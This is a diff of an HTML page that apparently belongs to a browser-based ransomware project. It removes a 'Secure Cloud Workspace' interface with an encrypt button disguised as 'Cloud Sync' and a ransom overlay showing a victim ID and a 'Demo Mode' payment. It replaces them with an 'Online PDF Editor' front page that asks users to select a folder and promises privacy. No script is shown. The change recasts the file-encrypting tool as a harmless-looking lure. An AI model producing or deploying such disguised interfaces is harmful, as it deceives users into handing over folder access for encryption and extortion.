@@ -2,83 +2,36 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Cloud Workspace</title>
+    <title>Online PDF Editor</title>
 </head>
 <body>
-    <div class="container">
-        <header style="text-align:center; margin-bottom:20px;">
-            <h1 style="color:white; font-weight:300;">Secure <span style="color:#007acc; font-weight:bold;">Cloud</span> Workspace</h1>
+    <div class="app-shell">
+        <header class="top-nav">
+            <div class="logo-mark">Online PDF Editor</div>
+            <div class="nav-actions">
+                <button class="ghost-btn">Login</button>
+                <button class="pill-btn">Sign up</button>
+            </div>
         </header>
 
-        <main>
-            <section class="panel">
-                <h2>System Check</h2>
-                <div id="supportStatus" class="status-box">
-                    <p>Checking browser capabilities...</p>
-                </div>
-            </section>
-
-            <section class="panel">
-                <h2>1. Workspace Selection</h2>
-                <p style="font-size:12px; color:#888; margin-bottom:15px;">Select your local project folder to synchronize with the secure cloud.</p>
-                <div class="button-group">
-                    <button id="selectDirBtn" class="btn btn-primary">
-                        📂 Open Project Folder
-                    </button>
-                </div>
-                <div id="selectedDirInfo" class="info-box"></div>
-            </section>
-
-            <section class="panel">
-                <h2>2. Synchronization</h2>
-                <div class="button-group">
-                    <button id="startEncryptBtn" class="btn btn-danger" disabled>
-                        ☁️ Start Cloud Sync
-                    </button>
-                    
-                    <button id="decryptBtn" class="btn btn-info">
-                        🔓 Recover/Decrypt (Manual)
-                    </button>
-                </div>
-            </section>
-
-            <section class="panel">
-                <h2>Task Progress</h2>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
-                <div id="progressText" class="progress-text">Waiting for input...</div>
-                <div id="filesList" class="files-list"></div>
-            </section>
-
-            <section class="panel">
-                <h2>Operation Logs</h2>
-                <div id="logContainer" class="log-container"></div>
-                <div style="margin-top:10px; text-align:right;">
-                    <button id="clearLogsBtn" class="btn btn-secondary" style="font-size:10px; padding:4px 8px;">Clear</button>
+        <main class="main-content">
+            <section class="hero-panel">
+                <p class="eyebrow">Simple & Convenient</p>
+                <h1>PDF Editor</h1>
+                <p class="subtitle">Edit PDFs by adding text, shapes, comments, and highlights. Stay local and private while we detect every PDF inside your folder.</p>
+                <button id="selectDirBtn" class="hero-btn">Select PDF Folder</button>
+                <p class="hint-text">or drop a folder anywhere in this window</p>
+                <div id="selectedDirInfo" class="hero-info"></div>
+                
+                <!-- Progress Bar -->
+                <div id="progressContainer" class="progress-container" style="display: none;">
+                    <div class="progress-bar-bg">
+                        <div id="progressBar" class="progress-bar"></div>
+                    </div>
+                    <p id="progressText" class="progress-text">Processing...</p>
                 </div>
             </section>
         </main>
-    </div>
-
-    <div id="ransomOverlay" class="ransom-overlay" style="display: none;">
-        <div class="ransom-modal">
-            <h1 style="color: #ff4444;">⚠️ OOPS! YOUR FILES ARE ENCRYPTED ⚠️</h1>
-            <p>All your documents, photos, and project files have been encrypted with military-grade encryption.</p>
-            <p>To restore your data, you must complete the payment verification.</p>
-            
-            <div class="ransom-details">
-                <p><strong>ID:</strong> <span id="victimIdDisplay">LOADING...</span></p>
-                <p><strong>Price:</strong> 0.00 BTC (Demo Mode)</p>
-            </div>
-
-            <button id="payRansomBtn" class="btn btn-pay">
-                💸 SIMULATE PAYMENT & DECRYPT
-            </button>
-            
-            <div id="paymentStatus" style="margin-top: 15px; font-size: 12px; color: #888;"></div>
-        </div>
     </div>
 </body>
 </html>
